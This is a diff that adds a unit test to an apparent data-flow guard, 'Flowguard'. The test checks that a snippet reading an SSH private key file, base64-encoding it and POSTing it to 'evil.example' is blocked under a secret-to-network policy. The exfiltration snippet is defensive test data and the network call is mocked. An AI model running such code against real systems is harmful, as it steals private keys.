@@ -148,6 +148,57 @@ urllib.request.urlopen(req)
             self.assertEqual(report.summary.precision_loss_count, 0)
             self.assertEqual(report.violations[0].policy, "SecretToNetwork")
 
+    def test_base64_encode_preserves_secret_provenance(self) -> None:
+        calls: list[dict[str, Any]] = []
+        original_urlopen = request.urlopen
+
+        def fake_urlopen(req: Any, data: Any = None, *args: Any, **kwargs: Any) -> bytes:
+            calls.append({"req": req, "data": data, "args": args, "kwargs": kwargs})
+            return b"ok"
+
+        request.urlopen = fake_urlopen
+        try:
+            with tempfile.TemporaryDirectory() as tmpdir:
+                secret_path = Path(tmpdir) / "id_rsa"
+                secret_path.write_text("PRIVATE KEY", encoding="utf-8")
+                runtime = FlowguardRuntime(
+                    secret_paths=[secret_path],
+                    precision_mode="strict",
+                )
+
+                with self.assertRaises(FlowguardBlocked) as blocked:
+                    runtime.run_python(
+                        """
+import base64
+import urllib.request
+with open(secret_path) as handle:
+    secret = handle.read()
+payload = base64.b64encode(secret.encode("utf-8"))
+req = urllib.request.Request(url, data=payload, method="POST")
+urllib.request.urlopen(req)
+""",
+                        inputs={
+                            "secret_path": str(secret_path),
+                            "url": "https://evil.example/upload",
+                        },
+                    )
+
+                report = runtime.report()
+
+                self.assertEqual(calls, [])
+                self.assertEqual(blocked.exception.policy, "SecretToNetwork")
+                self.assertEqual(report.summary.precision_loss_count, 0)
+                self.assertEqual(report.violations[0].policy, "SecretToNetwork")
+                self.assertIn(
+                    "base64.b64encode",
+                    [
+                        transform["operation"]
+                        for transform in report.violations[0].transforms
+                    ],
+                )
+        finally:
+            request.urlopen = original_urlopen
+
     def test_bytes_wrapper_reports_precision_loss(self) -> None:
         with tempfile.TemporaryDirectory() as tmpdir:
             secret_path = Path(tmpdir) / "id_rsa"
